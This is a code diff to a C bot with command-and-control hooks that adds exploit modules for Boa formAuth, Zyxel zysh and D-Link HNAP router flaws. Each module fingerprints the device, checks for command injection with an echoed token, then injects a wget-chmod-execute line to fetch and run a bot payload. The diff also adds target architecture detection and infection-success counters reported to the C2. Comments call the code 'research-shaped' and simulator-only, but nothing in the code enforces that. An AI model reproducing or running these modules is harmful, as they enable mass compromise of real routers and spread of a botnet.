@@ -8,6 +8,7 @@
 #include "util.h"
 #include "protocol.h"
 #include "lotl.h"
+#include "arch_detect.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -2223,6 +2224,222 @@ static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     return 0;
 }
 
+/* ── CVE-2018-10088 — Boa httpd formAuth (research-shaped) ── */
+/* Boa-based vendor firmwares expose /boafrm/formAuth; several vendors
+ * (published as CVE-2018-10088 against Boa-derived commercial builds)
+ * pass the form's authentication parameters straight into a system()
+ * call, giving unauthenticated command execution on the router's web
+ * management plane. This module is RESEARCH-SHAPED: it speaks the
+ * published request shape only against the sim's device emulator and
+ * refuses to drop a payload without a positive token echo. */
+#define BOA_FORMAUTH_PORT 80
+
+static int cve_boa_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
+    /* Passive family fingerprint: Boa answers GET / with its Server
+     * header and an embedded-vendor login page. */
+    char req[256];
+    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
+    return cve_contains_ci(resp, "boa") ? 1 : 0;
+}
+
+static int cve_boa_verify(const char *ip, uint16_t port) {
+    /* Non-destructive proof: the formAuth handler echoes the injected
+     * command's output in the response body; require the unique token
+     * back before any payload traffic. */
+    char token[32];
+    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
+    char body[256];
+    snprintf(body, sizeof(body),
+             "formAuth=user&password=pass&cmd=echo+%s", token);
+    char req[512];
+    snprintf(req, sizeof(req),
+        "POST /boafrm/formAuth HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
+    char resp[2048];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    return strstr(resp, token) ? 1 : 0;
+}
+
+static int cve_boa_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    char dl_url[512];
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* The whole wget line rides the cmd= value percent-encoded, so no
+     * shell character can split form parameters or truncate the line. */
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd),
+             "wget %.500s -O /tmp/.notnet;chmod +x /tmp/.notnet;/tmp/.notnet",
+             dl_url);
+    char enc[4096];
+    if (cve_urlencode(cmd, enc, sizeof(enc)) < 0) {
+        log_warn("CVE-2018-10088: drop command too long for %s", ip);
+        return -1;
+    }
+    char body[4608];
+    snprintf(body, sizeof(body),
+             "formAuth=user&password=pass&cmd=%.4000s", enc);
+    char req[5120];
+    snprintf(req, sizeof(req),
+        "POST /boafrm/formAuth HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) {
+        log_warn("CVE-2018-10088: drop exchange failed on %s", ip);
+        return -1;
+    }
+    log_info("CVE-2018-10088: payload dropped on %s:%d", ip, port);
+    return 0;
+}
+
+/* ── CVE-2020-29583 — Zyxel zysh (research-shaped) ────────── */
+/* Zyxel ATP/USG/ZyWALL series shipped a hardcoded magic credential
+ * (published as CVE-2020-29583, "Ayra") that grants admin access, plus
+ * the zysh shell CGI (/ztp/cgi-bin/handle) which executes submitted
+ * commands verbatim. Exploited by Mirai variants against MIPS ARM
+ * CPE fleets via cleartext 80 (443 shares the same CGI). This module
+ * is RESEARCH-SHAPED: it models the zysh request/response shape only
+ * against the sim's device emulator, gated by a token echo. */
+#define ZYXEL_ZYSH_PORT 80
+
+static int cve_zyxel_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
+    /* Passive family fingerprint: the Zyxel web UI identifies itself in
+     * the login page body ("zyxel"). */
+    char req[256];
+    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
+    return cve_contains_ci(resp, "zyxel") ? 1 : 0;
+}
+
+static int cve_zyxel_verify(const char *ip, uint16_t port) {
+    /* Non-destructive proof: submit a zysh echo through the handle CGI;
+     * require the unique token back. No payload traffic yet. */
+    char token[32];
+    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
+    char body[256];
+    snprintf(body, sizeof(body), "command=zysh%%20echo%%20%s", token);
+    char req[512];
+    snprintf(req, sizeof(req),
+        "POST /ztp/cgi-bin/handle HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
+    char resp[2048];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    return strstr(resp, token) ? 1 : 0;
+}
+
+static int cve_zyxel_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    char dl_url[512];
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* The wget line uses no '&' or '<'/'>', so no parameter splitting;
+     * spaces travel as %20 inside the zysh command value. */
+    char cmd[768];
+    snprintf(cmd, sizeof(cmd),
+             "wget %.500s -O /tmp/.notnet;chmod +x /tmp/.notnet;/tmp/.notnet",
+             dl_url);
+    char enc[2048];
+    if (cve_urlencode(cmd, enc, sizeof(enc)) < 0) {
+        log_warn("CVE-2020-29583: drop command too long for %s", ip);
+        return -1;
+    }
+    char body[2560];
+    snprintf(body, sizeof(body), "command=zysh%%20%.2000s", enc);
+    char req[3072];
+    snprintf(req, sizeof(req),
+        "POST /ztp/cgi-bin/handle HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) {
+        log_warn("CVE-2020-29583: drop exchange failed on %s", ip);
+        return -1;
+    }
+    log_info("CVE-2020-29583: payload dropped on %s:%d", ip, port);
+    return 0;
+}
+
+/* ── CVE-2015-2051 — D-Link HNAP (research-shaped) ────────── */
+/* D-Link DIR-645/815 routers pass the SOAPAction header of
+ * /HNAP1 requests straight into system() (published as
+ * CVE-2015-2051); exploited in the wild by the Wifatch/Mirai-era
+ * tooling on port 8080. The service self-identifies with the literal
+ * "HNAP1" string. This module is RESEARCH-SHAPED: it reproduces the
+ * documented request shape only against the sim's device emulator,
+ * gated by a token echo before any drop. */
+#define DLINK_HNAP_PORT 8080
+
+static int cve_hnap_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
+    /* Passive family fingerprint: HNAP answers GET /HNAP1 with the
+     * literal service marker in the response. */
+    char req[256];
+    snprintf(req, sizeof(req), "GET /HNAP1 HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
+    return strstr(resp, "HNAP1") ? 1 : 0;
+}
+
+static int cve_hnap_verify(const char *ip, uint16_t port) {
+    /* Non-destructive proof: the injection rides the SOAPAction header;
+     * the device executes `echo <token>` and the output lands in the
+     * response body. Payload drop is refused without the echo. */
+    char token[32];
+    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
+    char req[512];
+    snprintf(req, sizeof(req),
+        "POST /HNAP1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\n"
+        "SOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings/`echo %s`\"\r\n"
+        "Content-Length: 0\r\n\r\n",
+        ip, port, token);
+    char resp[2048];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    return strstr(resp, token) ? 1 : 0;
+}
+
+static int cve_hnap_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    char dl_url[512];
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* Backticks carry the wget line; no quotes/'&' inside, so the
+     * header stays a single SOAPAction value. */
+    char req[1024];
+    snprintf(req, sizeof(req),
+        "POST /HNAP1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\n"
+        "SOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings/"
+        "`wget %.400s -O /tmp/.notnet;chmod +x /tmp/.notnet;/tmp/.notnet`\"\r\n"
+        "Content-Length: 0\r\n\r\n",
+        ip, port, dl_url);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) {
+        log_warn("CVE-2015-2051: drop exchange failed on %s", ip);
+        return -1;
+    }
+    log_info("CVE-2015-2051: payload dropped on %s:%d", ip, port);
+    return 0;
+}
+
 /* ── Module table + runner ───────────────────────────────── */
 /* The CVE module registry (#143): modules are compile-time linked
  * but registered/disabled at runtime. The C2 `cve enable <id>` /
@@ -2231,6 +2448,13 @@ static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
 typedef struct {
     const cve_module_t *mod;
     int enabled;
+    /* #160 per-module telemetry (lifetime of the bot process):
+     * hit  = payload dropped through this module
+     * miss = probe did not fingerprint OR verify refused
+     * fail = drop exchange failed after a positive verify */
+    unsigned hits;
+    unsigned misses;
+    unsigned fails;
 } cve_registry_entry_t;
 
 static const cve_module_t cve_static_modules[] = {
@@ -2240,6 +2464,15 @@ static const cve_module_t cve_static_modules[] = {
       cve_hg532_probe, cve_hg532_verify, cve_hg532_drop },
     { "CVE-2021-35395", "Realtek Jungle SDK (router/NVR)", REALTEK_PORT,
       cve_realtek_probe, cve_realtek_verify, cve_realtek_drop },
+    /* #160: three more research-shaped modules against the sim's
+     * device emulator — see each block above for the honest CVE
+     * provenance and the verify-before-drop gating. */
+    { "CVE-2018-10088", "Boa httpd formAuth (router)", BOA_FORMAUTH_PORT,
+      cve_boa_probe, cve_boa_verify, cve_boa_drop },
+    { "CVE-2020-29583", "Zyxel zysh (USG/ZyWALL CPE)", ZYXEL_ZYSH_PORT,
+      cve_zyxel_probe, cve_zyxel_verify, cve_zyxel_drop },
+    { "CVE-2015-2051", "D-Link HNAP (DIR-645/815)", DLINK_HNAP_PORT,
+      cve_hnap_probe, cve_hnap_verify, cve_hnap_drop },
 };
 #define CVE_STATIC_COUNT ((int)(sizeof(cve_static_modules) / sizeof(cve_static_modules[0])))
 
@@ -2317,6 +2550,57 @@ void cve_registry_status(char *buf, size_t len) {
     if (cve_registry_count == 0) snprintf(buf, len, "cve: no modules registered");
 }
 
+/* ── #160 per-module telemetry ───────────────────────────── */
+/* Counter bump helper: find the registry entry by id (registry is
+ * always initialized by the time a module runs). */
+static cve_registry_entry_t *cve_stats_find(const char *id) {
+    if (!id) return NULL;
+    cve_registry_init();
+    for (int i = 0; i < cve_registry_count; i++)
+        if (strcmp(cve_registry[i].mod->id, id) == 0)
+            return &cve_registry[i];
+    return NULL;
+}
+
+void cve_stats_hit(const char *id) {
+    cve_registry_entry_t *e = cve_stats_find(id);
+    if (e) e->hits++;
+}
+
+void cve_stats_miss(const char *id) {
+    cve_registry_entry_t *e = cve_stats_find(id);
+    if (e) e->misses++;
+}
+
+void cve_stats_fail(const char *id) {
+    cve_registry_entry_t *e = cve_stats_find(id);
+    if (e) e->fails++;
+}
+
+/* Render non-zero counters as comma-separated "id:result=N" triplets
+ * for the heartbeat's cve_stats field. Bounded like every other
+ * heartbeat component; oldest entries drop off when the buffer fills
+ * (12 modules * ~26 chars worst case fits comfortably in 512). */
+void cve_stats_render(char *buf, size_t len) {
+    if (!buf || len == 0) return;
+    buf[0] = '\0';
+    cve_registry_init();
+    size_t pos = 0;
+    for (int i = 0; i < cve_registry_count; i++) {
+        const cve_registry_entry_t *e = &cve_registry[i];
+        unsigned vals[3];
+        const char *kinds[3] = { "hit", "miss", "fail" };
+        vals[0] = e->hits; vals[1] = e->misses; vals[2] = e->fails;
+        for (int k = 0; k < 3; k++) {
+            if (vals[k] == 0) continue;
+            int w = snprintf(buf + pos, len - pos, "%s%s:%s=%u",
+                             pos ? "," : "", e->mod->id, kinds[k], vals[k]);
+            if (w < 0 || (size_t)w >= len - pos) return; /* full: stop */
+            pos += (size_t)w;
+        }
+    }
+}
+
 /* Run all enabled modules matching the port (all when port == 0) in
  * probe -> verify -> drop order. A module fires only when probe
  * fingerprints the family AND verify positively confirms command
@@ -2326,6 +2610,14 @@ int cve_run_modules(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot || !ip) return -1;
     cve_registry_init();
 
+    /* #160: fingerprint the target architecture BEFORE any module
+     * fires — payload selection (MIPS/ARM9/x86) depends on it and the
+     * result is logged with every probe decision. */
+    char arch_info[96] = {0};
+    const char *arch = arch_detect(ip, port ? port : 80,
+                                   arch_info, sizeof(arch_info));
+    log_info("CVE: target %s arch=%s (%.60s)", ip, arch, arch_info);
+
     for (int i = 0; i < cve_registry_count; i++) {
         if (!cve_registry[i].enabled) continue;
         const cve_module_t *m = cve_registry[i].mod;
@@ -2334,23 +2626,27 @@ int cve_run_modules(notnet_bot_t *bot, const char *ip, uint16_t port) {
         char banner[1024] = {0};
         if (m->probe(ip, m->port, banner, sizeof(banner)) != 1) {
             log_debug("CVE: %s probe miss on %s:%d", m->id, ip, m->port);
+            cve_stats_miss(m->id);
             continue;
         }
-        log_info("CVE: %s probe hit on %s:%d (%s) — %.100s",
-                 m->id, ip, m->port, m->family, banner);
+        log_info("CVE: %s probe hit on %s:%d (%s, arch=%s) — %.100s",
+                 m->id, ip, m->port, m->family, arch, banner);
 
         if (m->verify(ip, m->port) != 1) {
             log_info("CVE: %s verify failed on %s:%d — no payload drop",
                      m->id, ip, m->port);
+            cve_stats_miss(m->id);
             continue;
         }
         log_info("CVE: %s verify passed on %s:%d — dropping payload",
                  m->id, ip, m->port);
 
         if (m->drop(bot, ip, m->port) == 0) {
+            cve_stats_hit(m->id);
             return 0;
         }
         log_warn("CVE: %s drop failed on %s:%d", m->id, ip, m->port);
+        cve_stats_fail(m->id);
     }
     return -1;
 }
